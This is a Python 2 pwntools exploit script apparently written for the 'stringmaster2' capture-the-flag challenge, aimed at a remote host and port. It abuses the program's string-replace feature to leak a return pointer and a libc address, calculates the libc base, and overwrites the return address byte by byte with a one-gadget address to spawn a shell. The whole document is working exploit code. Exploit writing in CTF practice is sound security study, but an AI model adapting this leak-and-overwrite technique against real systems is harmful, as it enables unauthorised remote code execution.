#!/usr/bin/env python2
from pwn import *
from huepy import *

context(terminal=['tmux', 'new-window'])
#p = process('./stringmaster2')
p = remote('35.207.132.47', 22225)

context(os='linux', arch='amd64')
#context.log_level='debug'

log.info("Mapping binary")
elf = ELF('stringmaster2')



################################# strings #################################
p.readuntil("String1: ")
s1 = p.readline().strip()
p.readuntil("String2: ")
s2 = p.readline().strip()
log.success("String1: %s, String2: %s" % (white(s1), white(s2)))
################################# end strings #################################

################################# Helpers ############################################
def write(old, new, count):
    for i in range(count):
        sleep(0.2)
        p.sendline("replace %s %s" % (old, new))

def prepareStack(old, new, count):
    write(old, "?", count)
    write("?", old, count-1)
    write("?", new, 1)

def leak():
    leaks = []
    p.read()
    p.sendline("replace ? ?")
    p.read()
    p.sendline("print")
    p.readuntil(s1)
    p.read(0x6e)
    leaks.append(u64(p.read(6)[:8].strip().ljust(8, "\x00"))) # return ptr at offset 0x79 from s1
    p.read(0xa)
    leaks.append(u64(p.read(6)[:8].strip().ljust(8, "\x00"))) # libc address at offset 0x88 from s1
    p.read()
    return leaks

def getRetPtr():
    sleep(0.2)
    p.sendline("print")
    p.readuntil(s1)
    p.read(0x6e)
    leak = u64(p.read(6)[:8].strip().ljust(8, "\x00"))
    p.read()
    return leak
################################# End helpers #################################


################################# EXPLOIT STAGE 1: INFO LEAK #################################
leaked = leak()
ret_prt = int(leaked[0])
libc_leak = int(leaked[1])

log.success("Leaked return pointer: " + white(hex(ret_prt)))
log.success("Leaked libc address: " + white(hex(libc_leak)))
#libc_base = libc_leak-0x20830 # local
libc_base = libc_leak-0x21b97 # remote
log.success("Calculated libc base: " + white(hex(libc_base)))
################################# EXPLOIT STAGE 2: ONESHOT #################################
oneshot = libc_base + 0x10a38c # remote
#oneshot = libc_base + 0xf1147  # local
oneshot_chars = p64(oneshot)
ret_chars = p64(ret_prt)

log.success("Oneshot is at: " + white(hex(oneshot)))
# Overwrite return address
log.info("Attepting overwrite...")

for i in range(0, 6):
    old = getRetPtr()
    for j in range(2, 100):
        log.info("------> Overwriting byte %d: 0x%x with 0x%x at offset %d" % (i, ord(ret_chars[i]), ord(oneshot_chars[i]), j))
        write(ret_chars[i], oneshot_chars[i], j)
        new = getRetPtr()
        if old != new:
            log.success("WORKED!!! New pointer: " + hex(new))
            break
        else:
            log.info("Guessed wrong...")

log.success("WE ARE IN CONTROL!!! RETURN TO ONESHOT AT 0X%x" % getRetPtr())
log.success("Spawning shell...")
sleep(0.2)
p.sendline("quit")
p.read()
p.interactive()
